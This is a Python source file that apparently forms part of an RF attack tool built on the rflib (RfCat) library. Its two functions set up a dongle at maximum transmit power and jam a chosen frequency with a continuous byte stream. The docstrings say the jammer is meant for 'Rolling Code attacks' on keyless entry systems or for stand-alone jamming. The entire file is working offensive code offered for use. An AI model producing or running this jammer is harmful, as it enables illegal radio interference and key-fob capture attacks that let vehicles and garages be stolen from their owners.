from rflib import *
import sys
sys.dont_write_bytecode = True

def setupJammer(idx_value, rf_settings):
    '''Used to setup jammer with second card for a Rolling Code attack or single for other attacks'''
    try:
        j = RfCat(idx=idx_value)
        j.setMdmModulation(MOD_ASK_OOK)
        j.setMdmDRate(rf_settings.baud_rate)# how long each bit is transmited for
        j.setMdmChanBW(60000)# how wide channel is
        j.setMdmChanSpc(rf_settings.channel_spacing)
        j.setMaxPower()
        #j.setRFRegister(PA_TABLE0, 0xFF)
        #j.setRFRegister(PA_TABLE1, 0xFF)
        j.setRFRegister(PKTCTRL1, 0xFF)
        j.setChannel(0)
        return j
    
    except Exception as e:
        print(f"Error setting up jammer: {e}")
        return None

def jamming(j, action, rf_settings, rolling_code, jamming_variance=0, retries=3):
    '''This is used to Jam frequencies with the parameters you set either
    stand alone or for rolling code attacks using jamming variance'''
    if j is None:
        print("Jammer setup failed. Cannot proceed with jamming.")
        return

    try:
        frequency = rf_settings.frequency + jamming_variance
        j.setFreq(frequency)

        if action == "start":
            print(f"Starting Jamming on: {frequency}")
            print("Press enter to stop jamming \n")
            for attempt in range(retries):
                try:
                    while not keystop():
                        j.RFxmit(b"A" * 1000)  # send a continuous stream of data to jam the frequency

                    if not rolling_code:
                        print("done")
                        j.setModeIDLE()
                    break

                except Exception as e:
                    print(f"Error during jamming attempt {attempt + 1}: {e}")
                    if attempt < retries - 1:
                        print("Retrying...")
                        time.sleep(1)
                    else:
                        print("Max retries reached. Jamming failed.")
        elif action == "stop":
            j.setModeIDLE()  # put dongle in idle mode to stop jamming
            print("Jamming Stopped")
    except Exception as e:
        print(f"Error during jamming: {e}")
